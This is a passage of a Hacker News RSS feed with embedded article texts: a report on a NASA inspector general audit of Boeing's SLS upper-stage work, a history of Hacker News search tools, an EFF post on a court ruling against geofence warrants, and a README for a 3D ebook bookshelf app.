            <description><![CDATA[<p>URL: <a href="https://www.flyingmag.com/modern/nasa-investigation-finds-boeing-hindering-americans-return-to-moon/">https://www.flyingmag.com/modern/nasa-investigation-finds-boeing-hindering-americans-return-to-moon/</a>, See on <a href="https://news.ycombinator.com/item?id=41229049">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-id="page-content" data-og-area="article-blocks"><p>Mismanagement and inexperience on the part of Boeing are creating severe delays and expenditures for NASA’s efforts to return Americans to the moon, according to a new report from the agency’s office of the inspector general (OIG).</p><p>The 38-page document, released Wednesday, paints the manufacturer’s quality control practices as inadequate and its workforce as insufficiently trained, blaming it for cost increases and schedule delays in the development of NASA’s Space Launch System (SLS) Block 1B. Yet the space agency has neglected to punish Boeing financially for these flaws, arguing that doing so would run contrary to the terms of its contract.</p><p>The heavy-lift rocket, a more powerful configuration of NASA’s existing SLS Block 1, is intended to make its maiden voyage in 2028 on the Artemis IV mission, a crewed lunar landing. It has been under development since 2014. Boeing is <a href="https://www.nasa.gov/humans-in-space/nasa-commits-to-future-artemis-moon-rocket-production/#:~:text=As%20part%20of%20the%20contract,John%20Honeycutt%2C%20SLS%20Program%20manager" target="_blank" rel="noreferrer noopener">under contract</a> to build Block 1B’s Exploration Upper Stage (EUS)—which will increase the SLS’ cargo capacity by about 40 percent—as well as the core stages for Block 1 on Artemis I and the upcoming Artemis II. Other SLS contractors include Aerojet Rocketdyne and Northrop Grumman.</p><h2 data-og-block-area="article-blocks" data-og-block-nth="1" data-og-block-type="core/heading" data-rawhtml="1" id="a_day_late_a_dollar_short">A Day Late, A Dollar Short</h2><p>Originally, the EUS was allocated a budget of $962 million and intended to fly on Artemis II, which in January was <a href="https://www.flyingmag.com/nasa-delays-first-crewed-us-moon-landing-in-half-a-century-to-2026/" target="_blank" rel="noreferrer noopener">pushed</a> to no earlier than September 2025. But by the OIG’s estimate, EUS costs are expected to balloon to $2 billion through 2025 and reach $2.8 billion by the time Artemis IV lifts off in 2028.</p><p>The office projects total SLS Block 1B costs will hit $5.7 billion before then—that’s more than $700 million over the Agency Baseline Commitment (ABC) NASA made last year. The EUS, at nearly triple its original budget, would account for close to half of those costs.</p><p>Add to that an expected six-year delay in the delivery of the system, and the OIG predicts Artemis IV’s launch could be postponed.</p><p>“NASA’s fiscal year 2024 SLS Program budget projections do not account for the additional funds needed for EUS development in fiscal years 2024 through 2027,” the report says. “Without additional funding, scheduled work will continue to be pushed into subsequent years as has been the case for the EUS over the last decade, leading to further cost increases and schedule delays.”</p><p>For example, the OIG says, NASA is evaluating potential risks to the EUS stage controller and avionics that could delay its delivery by another 14 months. NASA officials disagreed with the analysis.</p><h2 data-og-block-area="article-blocks" data-og-block-nth="2" data-og-block-type="core/heading" data-rawhtml="1" id="mismanaged_and_inexperienced">Mismanaged and Inexperienced</h2><p>The OIG interviewed officials at NASA headquarters, Marshall Space Flight Center, Michoud Assembly Facility, the Defense Contract Management Agency (DCMA), and Boeing. It also reviewed NASA and its contractors’ budgets, contract obligations, and quality control documents, among other materials.</p><p>In short, the office found that Boeing’s quality management system at Michoud does not adhere to NASA or international standards.</p><p>For example, Boeing Defense’s Earned Value Management System (EVMS)—which NASA uses to measure contract cost and schedule progress and is required on all projects with a lifecycle cost greater than $250M—has been disapproved by the Department of Defense since 2020. Officials claim this precludes Boeing from reliably predicting an EUS delivery date.</p><p>“Boeing’s process for addressing contractual noncompliance has been ineffective, and the company has generally been nonresponsive in taking corrective actions when the same quality control issues reoccur,” the OIG says.</p><p>The DCMA has issued several corrective action requests (CARs), handed down when quality control issues are identified, for the EVMS. Between September 2021 and September 2023, the agency issued Boeing a whopping 71 CARs after identifying quality control issues in the manufacturing of core and upper stages at Michoud. According to officials, that’s a massive number for a system that has been in development for so long.</p><p>“Boeing officials incorrectly approved hardware processing under unacceptable environmental conditions, accepted and presented damaged seals to NASA for inspection, and used outdated versions of work orders,” the report says. “DCMA also found that Boeing personnel made numerous administrative errors through changes to certified work order data without proper documentation.”</p><p>According to Safety and Mission Assurance officials at NASA and DCMA officials at Michoud, Boeing’s quality control issues stem from a workforce that is, by and large, unqualified.</p><p>During a visit to Michoud in 2023, for example, inspectors discovered that welding on a component of the SLS Core Stage 3 did not meet NASA standards. Per the report, unsatisfactory welding performed on a set of fuel tanks led directly to a seven-month delay in EUS completion.</p><p>“According to NASA officials, the welding issues arose due to Boeing’s inexperienced technicians and inadequate work order planning and supervision,” the OIG says. “The lack of a trained and qualified workforce increases the risk that Boeing will continue to manufacture parts and components that do not adhere to NASA requirements and industry standards.”</p><p>Complicating matters further is the relocation of SLS core stage production for Artemis III from Michoud to Kennedy, which will require Boeing to transition a decade of production processes developed at the former site to the latter.</p><p>The OIG said the manufacturer is developing a more robust, hands-on training program that could revamp its workforce but is long overdue.</p><p>“Some technicians reported they had to hunt through layers of documentation to identify required instructions and documentation of work history and key decisions related to the hardware,” the report says.</p><p>Further, maintaining that workforce may be difficult—the OIG predicts Boeing will spend an average of $26 million per month on EUS personnel through 2027. That was the norm for the company from February to August 2023.</p><p>Boeing management has also dropped the ball at higher levels. For instance, in the leadup to Artemis I, Boeing underestimated the complexity of building the SLS core stage, and EUS funding had to be redirected to that project.</p><p>“This ultimately led to a nearly one-year delay in EUS work and an additional $4 billion in funding to Boeing to cover the costs for the core stage development work,” according to the OIG.</p><p>In addition, NASA officials believe Boeing’s supply chain woes are of its own making, stemming from late negotiations and contract agreements.</p><h2 data-og-block-area="article-blocks" data-og-block-nth="3" data-og-block-type="core/heading" data-rawhtml="1" id="next_steps_for_nasa">Next Steps for NASA</h2><p>The OIG report paints the picture of a company in disarray from top to bottom.</p><p>The office did not pin the blame entirely on Boeing. It criticized NASA, for example, for spending more than $3 billion over ten years without submitting an ABC to Congress and the Office of Budget and Management. The ABC is the only official cost and schedule baseline used to measure project performance against expectations.</p><p>The office’s four recommendations, however, center around the manufacturer.</p><p>First, the OIG calls on the associate administrator of NASA’s Exploration Systems Development Mission Directorate (ESDMD), alongside the agency’s assistant administrator for procurement and chief of safety and mission assurance, to collaborate with Boeing on a more robust, NASA-approved quality management system. It also recommends officials penalize the company financially for its previous violations.</p><p>The OIG further directs the ESDMD to conduct a cost overrun analysis of Boeing’s EUS contract to minimize the impact to Artemis missions. Finally, it asks the associate administrator to coordinate with the DCMA to ensure Boeing’s compliance with EVMS requirements.</p><p>NASA agreed with three of the four recommendations and proposed actions to take. Interestingly, though, it rejected the suggestion of fining Boeing.</p><p>“NASA interprets this recommendation to be directing NASA to institute penalties outside the bounds of the contract,” said Catherine Koerner, deputy associate administrator of the ESDMD, in NASA’s response to the report. “There are already authorities in the contract, such as award fee provisions, which enable financial ramifications for noncompliance with quality control standards.”</p><p>Essentially, the agency believes it can keep Boeing in check by rewarding good behavior rather than penalizing mismanagement. The OIG, predictably, disagrees, characterizing NASA as “unresponsive” to what it considers significant safety concerns.</p><p>“In the end, failure to address these issues may not only hinder the Block 1B’s readiness for Artemis IV but also have a cascading impact on the overall sustainability of the Artemis campaign and NASA’s deep space human exploration efforts,” the report says.</p><p>Boeing will look to improve some of its quality control issues under the leadership of new CEO Kelly Ortberg, the ex-boss of Rockwell Collins who took over after the ousting of former CEO Dave Calhoun.</p><p>Calhoun’s departure this month comes as the company continues to be grilled over the <a href="https://www.flyingmag.com/boeing-subcontractor-scrutinized-over-door-plug-failure/" target="_blank" rel="noreferrer noopener">loss of a door plug</a> on a Boeing 737 Max 9 in January as well as <a href="https://www.flyingmag.com/modern/nasa-starliner-astronauts-may-not-return-until-february/" target="_blank" rel="noreferrer noopener">persistent issues</a> with Starliner, its semireusable spacecraft under contract with NASA for astronaut rotation missions to the&nbsp; International Space Station. Astronauts Butch Wilmore and Suni Williams may end up spending eight months on the orbital laboratory, rather than eight days as intended.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[History of Hacker News Search from 2007 to 2024 (114 pts)]]></title>
            <link>https://trieve.ai/history-of-hnsearch/</link>
            <guid>41228935</guid>
            <pubDate>Mon, 12 Aug 2024 20:27:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://trieve.ai/history-of-hnsearch/">https://trieve.ai/history-of-hnsearch/</a>, See on <a href="https://news.ycombinator.com/item?id=41228935">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> <p>We at Trieve are going to be launching a search engine for HackerNews with some additional features soon and thought it would be worth studying the history of HN search before finalizing things. Here’s what we found!</p>
<blockquote>
<p>Note: Did the research using our own HN search engine! :)</p>
</blockquote>
<blockquote>
<p>Note: I was happy looking at these old HN posts and seeing that so many of the comment/post’ers from the early days of HN
were, or eventually became, founders of YC companies.</p>
</blockquote>
<h2 id="first-gen--2007-2011">First Gen | 2007-2011</h2>
<h3 id="1-search-news-yc-bigheadlabs-on-march-17-2007">1. Search News YC (bigheadlabs) on March 17, 2007</h3>
<p>Written and shared by Jason Yan, Founder/CTO of Disqus (S07) (aka <a href="https://news.ycombinator.com/user?id=jasonyan">jsonyan</a>), on <a href="https://news.ycombinator.com/item?id=4780">March 17, 2007</a>. Can still be viewed <a href="https://web.archive.org/web/20070707020143/http://nycs.bigheadlabs.com/">here on the internet archive</a>.</p>
<p><img src="https://cdn.trieve.ai/blog/history-of-hnsearch/nycs.bigheadlabs.com.webp" alt="search-news-yc-screenshot"></p>
<p>I assume there was some indexing logic being done on the DJango server that Jason used.</p>
<h3 id="2-ycsearchcom-on-june-27-2007">2. ycsearch.com on June 27, 2007</h3>
<p>Quickly hacked together by Keven Lin (YC S07) (aka <a href="https://news.ycombinator.com/user?id=keven">keven</a>) on <a href="https://news.ycombinator.com/item?id=31012">June 27, 2007</a>.</p>
<p>I could not find a screenshot on Internet Archive, but Keven explained he built it with <a href="https://programmablesearchengine.google.com/about/">cse.google.com</a>.</p>
<h3 id="3-search-hacker-news-trk7com-on-september-18-2007">3. Search ‘Hacker News’ (trk7.com) on September 18, 2007</h3>
<p>Created and shared by Kesevan (aka <a href="https://news.ycombinator.com/user?id=cosmok">cosmok</a>) on <a href="https://news.ycombinator.com/item?id=56327">September 18, 2007</a>.</p>
<p>Can see the UI at this <a href="https://web.archive.org/web/20080306153636/http://trk7.com/yc">link on the internet archive</a>.</p>
<p><img src="https://cdn.trieve.ai/blog/history-of-hnsearch/trk7-hnsearch.webp" alt="trk7-search-hn-screenshot"></p>
<p>In the text of the original post (see <a href="https://news.ycombinator.com/item?id=1309589">here</a>), cosmok explains that he built it using Yahoo’s search API.</p>
<h3 id="4-searchyccom-independent-on-dec-31-2007--first-with-some-staying-power">4. searchyc.com (independent) on Dec 31, 2007 | First with Some Staying Power</h3>
<p>Independently created and shared by Mike Cheng (aka <a href="https://news.ycombinator.com/user?id=chengmi">chengmi</a>) and Alaska Miller (aka <a href="https://news.ycombinator.com/user?id=chengmi">alaskamiller</a>) on <a href="https://news.ycombinator.com/item?id=93864">Dec 31, 2007</a>.</p>
<p>I surmise from the comment on the post that the motivation here was ycsearch being limited in terms of HN-specific filters and the bigheadlabs one being un-maintained.</p>
<p><img src="https://cdn.trieve.ai/blog/history-of-hnsearch/searchyc.com.webp" alt="search-yc-screenshot"></p>
<p>Judging from the last <a href="https://news.ycombinator.com/item?id=35959">paulg comment on this thread</a> it seems like, similar to ycsearch, it was built using <a href="https://programmablesearchengine.google.com/about/">cse.google.com</a>.</p>
<p>The HN community seemed to get a lot of value out of it as in a <a href="https://news.ycombinator.com/item?id=2605959">HN thread posted when it went down on June 1 of 2011</a> there are multiple users explaining how important it was to them:</p>
<blockquote>
<p><strong>iheartmemcache</strong>: This service is a major component of this community; as such, I’ll host this on whatever metal you need. My contact information is in my profile. Ping me on G-talk and we can have this sorted out by the morning (if you’re in PST).</p>
</blockquote>
<blockquote>
<p><strong>bkrausz</strong>: What kind of traffic does SearchYC get? Is a $40/mo Linode not sufficient? I would gladly pay that (or be content with some Google ads in the right bar). Hell, I’d even maintain the site…it’s a great service.</p>
</blockquote>
<blockquote>
<p><strong>g123g</strong>: Hopfully you will be able to bring it back soon. <span>SearchYC.com</span> is the best way to search the treasure trove that HN has become.</p>
</blockquote>
<p>Worth mentioning that HNSearch (mentioned further below) was up by this point in time. Judging by comments on the shutdown post it seems like traffic was somewhat split:</p>
<blockquote>
<p><strong>swombat</strong>: What’s wrong with <a href="http://www.hnsearch.com/">http://www.hnsearch.com</a> ?</p>
<blockquote>
<p><strong>evangineer</strong>: Just got zero hits on a search that I know there is at least one result for. Same search worked fine on <span>searchyc.com</span> a few days ago.</p>
</blockquote>
</blockquote>
<h2 id="second-gen---octopartthriftdb-powered-hnsearch--2011-2014">Second Gen - Octopart/ThriftDB-powered HNSearch | 2011-2014</h2>
<p>The official launch of HNSearch was posted by Paul Graham, founder of Y-Combinator itself (aka <a href="https://news.ycombinator.com/user?id=pg">pg</a>), and Andres Morey, founder of Octopart (W07) (aka <a href="https://news.ycombinator.com/user?id=andres">andres</a>), separately on June 4, 2011. Andres posted it as an <a href="https://news.ycombinator.com/item?id=2619892">API contest here</a> to build the best thing on top of the HNSearch API where the winner would get a 27-inch Dell monitor. PG posted it as an official announcement on <a href="https://news.ycombinator.com/item?id=2619736">HN here</a> which linked to <a href="https://web.archive.org/web/20110618105517/http://ycombinator.com/newsnews.html">ycombinator.com in a now only archive-available page</a>.</p>
<p><img src="https://cdn.trieve.ai/blog/history-of-hnsearch/hnsearch-api-contest.webp" alt="octopart/thriftdb-search-screenshot"></p>
<p>Building search for HN has certainly been a trial for us and we felt validated seeing that <a href="https://news.ycombinator.com/item?id=35959">PG first mentioned the Octopart guys using ThriftDB to make this in 2007 4yrs before it released</a>.</p>
<p>I think the best part of HNSearch was that third-party applications were built on top of it. It seems, judging by the <a href="https://news.ycombinator.com/item?id=7404972">HNSearch shutdown post</a>, that it was well-loved by HN users and also well-replaced by Algolia.</p>
<blockquote>
<p><strong>clamprecht</strong>: Can someone outline the benefits of the new one over the old one? When I first tried the new one, the UI was severely lacking. I saw the fixed a few things, but I haven’t evaluated it again.
I don’t always use the HN search engine, but when I do, it’s usually very helpful. I’d hate to lose that.</p>
<blockquote>
<p><strong>swah</strong>I noticed the new one is much faster..</p>
</blockquote>
</blockquote>
<h2 id="third-gen---algolia-powered-search--2014-current">Third Gen - Algolia powered search | 2014-current</h2>
<p>The first HN post I was able to find mentioning Algolia HN search was <a href="https://news.ycombinator.com/item?id=7126301">Ask HN: What do you think about our last HN Search update? on Jan 26, 2014</a> posted by Julian Lemoine, founder/CTO of Algolia (W14) aka <a href="https://news.ycombinator.com/user?id=jlemoine">jlemoine</a>.</p>
<p><img src="https://cdn.trieve.ai/blog/history-of-hnsearch/algolia-hn-search.webp" alt="algolia-hn-search-screenshot"></p>
<p>Algolia’s ability to get HN search up so quickly is really impressive. If you look at the <a href="https://github.com/algolia/hn-search/commits/master/?after=e27760e09840a6fa3efc592649fceb89237e4c2f+1119">Github repo</a> it seems like they started in Sep 2013 and released in Jan 2014.</p>
<p>We also took about 6 months to get everything up having <a href="https://github.com/devflowinc/trieve-hn-discovery/commits/main/?after=0163ad22215a28a3492fc86f0d50e4a9bd338f3b+139">started in Feb 2024 and releasing in Aug 2024</a>. I can say now, with firsthand experience, that timeline is not easy to operate on. Especially given certain devtooling was less mature in 2013.</p>
<p><a href="https://news.ycombinator.com/item?id=7126301">Algolia asked the community for feedback post-launch in 2014</a> and implemented several improvements including <a href="https://news.ycombinator.com/item?id=37881130">additional filter types and improved indexing speed in late 2023</a>. We think it’s incredibly accurate for keyword search and has all the filters and options that we would want.</p>
<h2 id="honorable-mentions-during-the-algolia-era">Honorable Mentions during the Algolia era</h2>
<ul>
<li><a href="https://hackersearch.net/">hackersearch.net</a> by <a href="https://news.ycombinator.com/user?id=jnnnthnn">jnnnthnn</a> posted May 2024 | semantic search engine using OpenAI embeddings</li>
<li><a href="https://deephn.org/">deephn.org</a> by <a href="https://news.ycombinator.com/user?id=wolfgarbe">wolfgarbe</a> posted April 13, 2021 | full-text search of both HN posts and linked webpages</li>
<li><a href="https://hackernews.demo.vectara.com/">hackernews.demo.vectara.com</a> by <a href="https://news.ycombinator.com/user?id=ofermend">ofermend</a> posted July 2024 | semantic search for past 6mths of data</li>
<li><a href="https://searchhacker.news/">searchhacker.news</a> by <a href="https://news.ycombinator.com/user?id=isoprophlex">isoprophlex</a> posted April 2024 | keyword search over discussions re-ranked by dense semantic vectors</li>
<li><a href="https://hn.lixiasearch.com/">hn.lixiasearch.com</a> by <a href="https://news.ycombinator.com/user?id=larose">larose</a> posted February 2024 | unknown data level and indexing strategy</li>
<li><a href="https://orangewords.com/search">orangewords.com</a> by <a href="https://news.ycombinator.com/submitted?id=cmcollier">cmcollier</a> (not posted to HN yet) | all of HN indexed in Vespa with RAG</li>
</ul> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Federal appeals court finds geofence warrants "categorically" unconstitutional (519 pts)]]></title>
            <link>https://www.eff.org/deeplinks/2024/08/federal-appeals-court-finds-geofence-warrants-are-categorically-unconstitutional</link>
            <guid>41228630</guid>
            <pubDate>Mon, 12 Aug 2024 19:57:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eff.org/deeplinks/2024/08/federal-appeals-court-finds-geofence-warrants-are-categorically-unconstitutional">https://www.eff.org/deeplinks/2024/08/federal-appeals-court-finds-geofence-warrants-are-categorically-unconstitutional</a>, See on <a href="https://news.ycombinator.com/item?id=41228630">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article role="article">
  
  
  <div><p>In a major decision on Friday, the federal Fifth Circuit Court of Appeals <a href="https://www.ca5.uscourts.gov/opinions/pub/23/23-60321-CR0.pdf">held</a> that <a href="https://www.eff.org/deeplinks/2019/04/googles-sensorvault-can-tell-police-where-youve-been">geofence warrants</a> are “categorically prohibited by the Fourth Amendment.” Closely following arguments EFF has made in a <a href="https://www.eff.org/deeplinks/2023/04/first-us-appellate-court-decide-finds-geofence-warrant-unconstitutional">number</a> <a href="https://www.eff.org/deeplinks/2022/10/california-court-suppresses-evidence-overbroad-geofence-warrant">of</a> <a href="https://www.eff.org/deeplinks/2023/01/eff-files-amicus-briefs-two-important-geofence-search-warrant-cases">cases</a>, the court found that geofence warrants constitute the sort of “general, exploratory rummaging” that the drafters of the Fourth Amendment intended to outlaw. EFF applauds this decision because it is essential that every person feels like they can simply take their cell phone out into the world without the fear that they might end up a criminal suspect because their location data was swept up in open-ended digital dragnet.</p>
<p>The new Fifth Circuit case, <em>United States v. Smith</em>, involved an armed robbery and assault of a US Postal Service worker at a post office in Mississippi in 2018. After several months of investigation, police had no identifiable suspects, so they obtained a geofence warrant covering a large geographic area around the post office for the hour surrounding the crime. Google responded to the warrant with information on several devices, ultimately leading police to the two defendants.</p>
<p>On appeal, the Fifth Circuit reached several important holdings.</p>
<p>First, it determined that under the Supreme Court’s landmark ruling in <em>Carpenter v. United States</em>, individuals have a reasonable expectation of privacy in the location data implicated by geofence warrants. As a result, the court broke from the <a href="https://www.eff.org/deeplinks/2024/07/eff-tells-minnesota-supreme-court-strike-down-geofence-warrant-fourth-circuit">Fourth Circuit’s deeply flawed decision last month</a> in <em>United States v. Chatrie</em>, noting that although geofence warrants can be more “limited temporally” than the data sought in <em>Carpenter</em>, geofence location data is still highly invasive because it can expose sensitive information about a person’s associations and allow police to “follow” them into private spaces.</p>
<p>Second, the court found that even though investigators seek warrants for geofence location data, these searches are inherently unconstitutional. As the court noted, geofence warrants require a provider, almost always Google, to search “the entirety” of its reserve of location data “while law enforcement officials have no idea who they are looking for, or whether the search will even turn up a result.” Therefore, “the quintessential problem with these warrants is that they <em>never</em> include a specific user to be identified, only a temporal and geographic location where any given user <em>may</em> turn up post-search. That is constitutionally insufficient.”</p>
<p>Unsurprisingly, however, the court found that in 2018, police could have relied on such a warrant in “good faith,” because geofence technology was novel, and police reached out to other agencies with more experience for guidance. This means that the evidence they obtained will not be suppressed in this case.</p>
<p>Nevertheless, it is gratifying to see an appeals court recognize the fundamental invasions of privacy created by these warrants and uphold our constitutional tradition prohibiting general searches. Police around the country have increasingly relied on geofence warrants and other reverse warrants, and this opinion should act as a warning against narrow applications of Fourth Amendment precedent in these cases.</p>

</div>

          </article>
    </div><div>
          <h2>Join EFF Lists</h2>
        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: I built an animated 3D bookshelf for ebooks (255 pts)]]></title>
            <link>https://github.com/mawise/bookshelf</link>
            <guid>41227350</guid>
            <pubDate>Mon, 12 Aug 2024 17:53:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/mawise/bookshelf">https://github.com/mawise/bookshelf</a>, See on <a href="https://news.ycombinator.com/item?id=41227350">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">3D Bookshelf</h2><a id="user-content-3d-bookshelf" aria-label="Permalink: 3D Bookshelf" href="#3d-bookshelf"></a></p>
<p dir="auto">Inspired by [<a href="https://scastiel.dev/animated-3d-book-css" rel="nofollow">https://scastiel.dev/animated-3d-book-css</a>] and [<a href="https://github.com/janeczku/calibre-web">https://github.com/janeczku/calibre-web</a>]</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/mawise/bookshelf/master/demo.gif"><img src="https://raw.githubusercontent.com/mawise/bookshelf/master/demo.gif" alt="" data-animated-image=""></a></p>
<p dir="auto">This is a 3D bookshelf to browse ebooks. It pulls ebook metadata and cover art from a <a href="https://calibre-ebook.com/" rel="nofollow">Calibre</a> library.  It uses the cover image aspect ratio to determine book height, all books are the same width.  It uses page-count data (if available) to determine the thickness of the book.  The Calibre <code>comment</code> metadata shows up as the back-cover text along with a book download link and page count.</p>
<p dir="auto">Special thanks to <a href="https://www.brandonsanderson.com/" rel="nofollow">Brandon Sanderson</a> and <a href="https://pluralistic.net/" rel="nofollow">Cory Doctorow</a> who publish their books without DRM, and to <a href="https://standardebooks.org/" rel="nofollow">Standard Ebooks</a> and <a href="https://www.planetebook.com/" rel="nofollow">Planet Ebook</a> for beautifully typeset public domain ebooks.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="bundle install
ruby app.rb <path-to-calibre-library>"><pre>bundle install
ruby app.rb <span>&lt;</span>path-to-calibre-library<span>&gt;</span></pre></div>
<p dir="auto">Optionally: Install the <a href="https://github.com/kiwidude68/calibre_plugins/tree/main/count_pages">count pages</a> Calibre plugin to make the books variable-width based on estimated page counts.  Configure the plugin with a custom column named <code>pagecount</code> and the app will automatically discover any page-count data.</p>
</article></div></div>]]></description>
        </item>
    </channel>
</rss>